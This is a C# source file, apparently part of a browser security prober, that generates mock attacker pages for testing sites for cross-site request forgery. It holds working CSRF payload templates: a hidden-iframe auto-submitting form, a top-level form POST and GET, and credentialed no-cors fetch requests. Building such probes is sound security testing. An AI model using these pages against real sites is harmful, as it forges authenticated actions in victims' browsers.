using System.Text.Json;
using Trowser.Security.XsLeaks;

namespace Trowser.Security.CrossSite;

/// <summary>Mock attacker-origin pages for browser-faithful CSRF delivery (WebView2 / Chromium).</summary>
internal static class CsrfAttackerPageBuilder
{
    public static string PageUrl(string runId, string technique, int index, string? attackerOrigin = null)
    {
        var origin = string.IsNullOrWhiteSpace(attackerOrigin)
            ? AttackerOrigin
            : attackerOrigin.TrimEnd('/');
        return $"{origin}/csrf/{runId}/{technique}/{index}";
    }

    public static string ResolveAttackerOrigin(string? attackerSite, string victimUrl) =>
        AttackerPageBuilder.ResolveAttackerOrigin(attackerSite, victimUrl);

    public const string AttackerOrigin = AttackerPageBuilder.AttackerOrigin;

    public static string BuildHtml(CrossSiteCsrfProber.Target target, string technique)
    {
        return technique switch
        {
            "iframe-form-post" => BuildIframeFormPost(target),
            "top-level-form-post" => BuildTopLevelFormPost(target),
            "fetch-no-cors" => BuildFetchNoCors(target, "application/x-www-form-urlencoded"),
            "fetch-text-plain" => BuildFetchNoCors(target, "text/plain"),
            "top-level-get" => BuildTopLevelGet(target),
            _ => BuildFetchNoCors(target, GuessContentType(target))
        };
    }

    private static string GuessContentType(CrossSiteCsrfProber.Target target)
    {
        if (!string.IsNullOrWhiteSpace(target.ContentType))
            return target.ContentType;
        var body = target.Body?.TrimStart() ?? "";
        if (body.StartsWith('{') || body.StartsWith('['))
            return "application/json";
        if (body.Contains('='))
            return "application/x-www-form-urlencoded";
        return "text/plain;charset=UTF-8";
    }

    private static string BuildIframeFormPost(CrossSiteCsrfProber.Target target)
    {
        var action = JsonSerializer.Serialize(target.Url);
        var method = JsonSerializer.Serialize(target.Method.ToUpperInvariant());
        var fields = JsonSerializer.Serialize(ParseFormFields(target));
        return $$"""
<!DOCTYPE html><html><head><meta charset="utf-8"><title>CSRF iframe POST</title></head><body>
<script>
(function(){
  var result = { technique: 'iframe-form-post', ok: false, triggered: false, error: null };
  function done() { document.title = 'CSRF:' + JSON.stringify(result); }
  try {
    var iframe = document.createElement('iframe');
    iframe.name = 'csrf_iframe';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    var f = document.createElement('form');
    f.method = {{method}};
    f.action = {{action}};
    f.target = iframe.name;
    var fields = {{fields}};
    Object.keys(fields).forEach(function(k){
      var input = document.createElement('input');
      input.type = 'hidden';
      input.name = k;
      input.value = fields[k];
      f.appendChild(input);
    });
    document.body.appendChild(f);
    iframe.onload = function(){ result.ok = true; result.triggered = true; done(); };
    iframe.onerror = function(){ result.ok = true; result.triggered = true; done(); };
    setTimeout(function(){ if (!result.triggered) { result.triggered = true; result.ok = true; done(); } }, 8000);
    result.triggered = true;
    f.submit();
  } catch(e) {
    result.error = e && e.message || String(e);
    done();
  }
})();
</script></body></html>
""";
    }

    private static string BuildTopLevelFormPost(CrossSiteCsrfProber.Target target)
    {
        var action = JsonSerializer.Serialize(target.Url);
        var fields = JsonSerializer.Serialize(ParseFormFields(target));
        return $$"""
<!DOCTYPE html><html><head><meta charset="utf-8"><title>CSRF top-level POST</title></head><body>
<script>
(function(){
  var result = { technique: 'top-level-form-post', ok: false, triggered: false, error: null };
  function done() { document.title = 'CSRF:' + JSON.stringify(result); }
  try {
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = {{action}};
    var fields = {{fields}};
    Object.keys(fields).forEach(function(k){
      var input = document.createElement('input');
      input.type = 'hidden';
      input.name = k;
      input.value = fields[k];
      f.appendChild(input);
    });
    document.body.appendChild(f);
    result.triggered = true;
    f.submit();
    result.ok = true;
    setTimeout(done, 500);
  } catch(e) {
    result.error = e && e.message || String(e);
    done();
  }
})();
</script></body></html>
""";
    }

    private static string BuildTopLevelGet(CrossSiteCsrfProber.Target target)
    {
        var url = JsonSerializer.Serialize(target.Url);
        return $$"""
<!DOCTYPE html><html><head><meta charset="utf-8"><title>CSRF top-level GET</title></head><body>
<script>
(function(){
  var result = { technique: 'top-level-get', ok: false, triggered: false, error: null };
  function done() { document.title = 'CSRF:' + JSON.stringify(result); }
  try {
    result.triggered = true;
    location.href = {{url}};
    result.ok = true;
    setTimeout(done, 400);
  } catch(e) {
    result.error = e && e.message || String(e);
    done();
  }
})();
</script></body></html>
""";
    }

    private static string BuildFetchNoCors(CrossSiteCsrfProber.Target target, string contentType)
    {
        var url = JsonSerializer.Serialize(target.Url);
        var method = JsonSerializer.Serialize(target.Method.ToUpperInvariant());
        var body = JsonSerializer.Serialize(target.Body ?? "");
        var ct = JsonSerializer.Serialize(contentType);
        var tech = contentType.Contains("text/plain", StringComparison.OrdinalIgnoreCase)
            ? "fetch-text-plain"
            : "fetch-no-cors";
        return $$"""
<!DOCTYPE html><html><head><meta charset="utf-8"><title>CSRF fetch</title></head><body>
<script>
(function(){
  var result = { technique: {{JsonSerializer.Serialize(tech)}}, ok: false, triggered: false, error: null };
  function done() { document.title = 'CSRF:' + JSON.stringify(result); }
  var url = {{url}};
  var method = {{method}};
  var body = {{body}};
  var headers = { 'Content-Type': {{ct}} };
  result.triggered = true;
  fetch(url, { method: method, body: method === 'GET' || method === 'HEAD' ? undefined : body,
    credentials: 'include', mode: 'no-cors', headers: headers })
    .then(function(){ result.ok = true; done(); })
    .catch(function(e){ result.error = e && e.message || String(e); done(); });
  setTimeout(function(){ if (!result.ok && !result.error) { result.ok = true; done(); } }, 8000);
})();
</script></body></html>
""";
    }

    internal static Dictionary<string, string> ParseFormFields(CrossSiteCsrfProber.Target target)
    {
        var fields = new Dictionary<string, string>(StringComparer.Ordinal);
        if (string.IsNullOrWhiteSpace(target.Body))
            return fields;

        var trimmed = target.Body.TrimStart();
        if (trimmed.StartsWith('{'))
            return fields;

        foreach (var part in target.Body.Split('&', StringSplitOptions.RemoveEmptyEntries))
        {
            var eq = part.IndexOf('=');
            if (eq < 0)
            {
                fields[Uri.UnescapeDataString(part)] = "";
                continue;
            }

            var name = Uri.UnescapeDataString(part[..eq]);
            var value = Uri.UnescapeDataString(part[(eq + 1)..]);
            fields[name] = value;
        }

        return fields;
    }
}
